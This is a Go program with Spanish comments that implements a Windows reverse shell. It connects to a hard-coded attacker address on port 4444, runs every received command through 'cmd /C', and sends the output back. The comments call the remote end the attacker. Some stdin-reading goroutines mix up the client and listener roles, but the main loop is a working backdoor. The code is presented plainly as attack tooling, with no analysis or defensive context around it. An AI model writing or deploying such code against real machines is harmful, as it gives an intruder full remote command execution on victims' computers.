package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strings"
)

func main() {
    // Dirección IP del atacante y puerto
    c, err := net.Dial("tcp", "192.168.0.14:4444")
    if err != nil {
        panic(err)
    }
    defer c.Close()

    // Canal para capturar la entrada estándar y enviar comandos
    go func() {
        reader := bufio.NewReader(os.Stdin)
        for {
            fmt.Print("Comando a enviar: ")
            command, _ := reader.ReadString('\n')
            // Enviar el comando al atacante
            c.Write([]byte(command))
        }
    }()

    // Canal para recibir y mostrar la respuesta del atacante
    go func() {
        responseReader := bufio.NewReader(c)
        for {
            response, err := responseReader.ReadString('\n')
            if err == io.EOF {
                break
            }
            if err != nil {
                fmt.Println("Error al leer la respuesta:", err)
                return
            }
            fmt.Print("Respuesta recibida: ", response)
        }
    }()

    // Mantener la conexión abierta y ejecutar comandos
    for {
        // Leer el comando recibido desde el atacante
        buffer := make([]byte, 1024)
        n, err := c.Read(buffer)
        if err != nil {
            fmt.Println("Error al leer el comando:", err)
            break
        }

        receivedCommand := strings.TrimSpace(string(buffer[:n]))
        fmt.Println("Comando recibido:", receivedCommand)

        // Ejecutar el comando recibido usando cmd en Windows
        cmd := exec.Command("cmd", "/C", receivedCommand)
        output, err := cmd.CombinedOutput()
        if err != nil {
            fmt.Println("Error al ejecutar el comando:", err)
        }

        // Enviar la salida de vuelta al atacante
        c.Write(output)
    }
}
